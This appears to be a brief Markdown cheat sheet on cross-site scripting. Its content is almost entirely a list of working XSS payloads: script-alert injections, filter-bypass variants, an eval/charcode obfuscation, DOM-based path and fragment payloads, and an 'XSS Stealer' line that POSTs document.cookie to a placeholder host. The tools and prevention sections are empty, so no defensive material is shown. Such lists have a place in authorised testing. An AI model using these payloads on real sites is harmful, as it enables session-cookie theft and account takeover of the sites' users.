# XSS Types
```
Reflected
Stored
DOM Based
```

# Where to find XSS
```
```

# XSS Payloads
```
<script>alert(1)</script>
<scRiPt>alert(1)</scRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<body onload=alert(/XSS/.source)>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>     # alert(1) = Char codes: [97, 108, 101, 114, 116, 40, 49, 41]
=";</script><script>alert(1)</script>
';alert(1);//

## DOM Based
/index.php/"><script>alert('XSS')</script>
/index.php#<svg onload=alert('XSS')>

## XSS Stealer
<script>fetch('https://burp-url', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```

# XSS Testing Tools
```

```

# XSS Prevention Techniques
```

```